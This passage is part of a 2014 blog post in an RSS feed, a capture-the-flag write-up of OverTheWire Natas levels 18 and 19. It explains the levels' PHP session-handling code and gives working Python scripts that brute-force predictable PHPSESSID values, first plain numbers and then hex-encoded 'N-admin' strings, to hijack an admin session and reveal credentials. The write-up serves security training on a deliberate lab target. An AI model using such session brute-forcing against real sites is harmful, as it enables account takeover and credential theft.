        &lt;span class="nx"&gt;$_SESSION&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// backwards compatible, secure&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In the case it's true, a function that prints the credentials is called, printing our password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;print_credentials&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; == 1) {
    print &amp;quot;You are an admin. The credentials for the next level are:&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    print &amp;quot;&lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;Username: natas19\n&amp;quot;;
    print &amp;quot;Password: &lt;span class="nt"&gt;&amp;lt;censored&amp;gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;&amp;quot;;
    } else {
    print &amp;quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&amp;quot;;
    }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If &lt;em&gt;%my_session&lt;/em&gt; is not true, it  will look to the HTTP request and search for username and password. If it finds them, it creates a session id:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;isValidAdminLogin&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="cm"&gt;/* This method of authentication appears to be unsafe and has been disabled for now. */&lt;/span&gt;
        &lt;span class="c1"&gt;//return 1;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, in resume, we have a function that starts the session, first checking if the session id is in the cookie and if this session id is a number. If true, it checks if it's a fresh session. Then, it checks if the word &lt;em&gt;admin&lt;/em&gt; is in &lt;a href="http://en.wikipedia.org/wiki/Session_ID"&gt;SESSION_ID&lt;/a&gt;. If not, it invalidates the session.&lt;/p&gt;
&lt;p&gt;If the SESSION_ID is the admin session ID, the password for the next is shown.&lt;/p&gt;
&lt;p&gt;After that, it calls PHP's &lt;a href="http://php.net/manual/en/function.session-start.php"&gt;session_starts()&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The session ID is given by the variable &lt;em&gt;PHPSESSID&lt;/em&gt;, and that's what we are going to brute force to get our password.&lt;/p&gt;
&lt;p&gt;The variable &lt;a href="http://php.net/manual/en/reserved.variables.request.php"&gt;$_REQUEST&lt;/a&gt;  is an  array that by default contains the contents of &lt;em&gt;$_GET&lt;/em&gt;, &lt;em&gt;$_POST&lt;/em&gt; and &lt;em&gt;$_COOKIE&lt;/em&gt;.&lt;/p&gt;
&lt;h4&gt;Crafting the attack:&lt;/h4&gt;
&lt;p&gt;We write the following script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;You are an admin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas18&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;*************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas18.natas.labs.overthewire.org/index.php?&amp;#39;&lt;/span&gt;

    &lt;span class="n"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="n"&gt;MAXID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;640&lt;/span&gt;

    &lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After a few minutes, we get our password.&lt;/p&gt;
&lt;h3&gt;Level 19: Hijacking Session ID II&lt;/h3&gt;
&lt;p&gt;This level looks exactly like the previous except that it has the following message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This page uses mostly the same code as the previous level, but session IDs are no longer sequential...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/OQ7LATt.png" /&gt;&lt;/p&gt;
&lt;p&gt;This time we have no access to the source code to see how the session IDs are created. However, we have access to the values in the cookie which are created by the session.&lt;/p&gt;
&lt;p&gt;We write the following snippet:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This produces the following output:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3236312&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3136372&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3534342&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3238352&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3334332&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;(...)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So the session ID is an hexadecimal number. Let's decode it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;id_hex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dict_from_cookiejar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id_hex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mmmm, interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="mi"&gt;548&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="mi"&gt;275&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="mi"&gt;237&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="mi"&gt;535&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
&lt;span class="p"&gt;(...)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The session ID is really a random number (below 640) attached to the given username. That's easy.&lt;/p&gt;
&lt;h4&gt;Crafting the attack:&lt;/h4&gt;
&lt;p&gt;We write the following script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;-admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;You are an admin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas19&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;***********************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas19.natas.labs.overthewire.org/index.php?&amp;#39;&lt;/span&gt;

    &lt;span class="n"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="n"&gt;MAXID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;640&lt;/span&gt;

    &lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we get our password in the 501th attempt. Awesome.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;That's it. The &lt;a href="https://github.com/bt3gl/CTFs-Gray-Hacker-and-PenTesting/tree/master/Web_Exploits"&gt;source code is available&lt;/a&gt; as usual.&lt;/p&gt;
&lt;p&gt;Hack all the things!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Marina von Steinkirch</dc:creator><pubDate>Thu, 16 Oct 2014 06:01:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-16:exploiting-the-web-in-20-lessons-natas.html</guid><category>Wargames</category><category>Python</category><category>BurpSuite</category><category>request</category><category>PHP</category><category>JavaScript</category><category>SQLi</category><category>Command_Injection</category><category>MySQL</category><category>XOR</category><category>Brute_Force</category></item></channel></rss>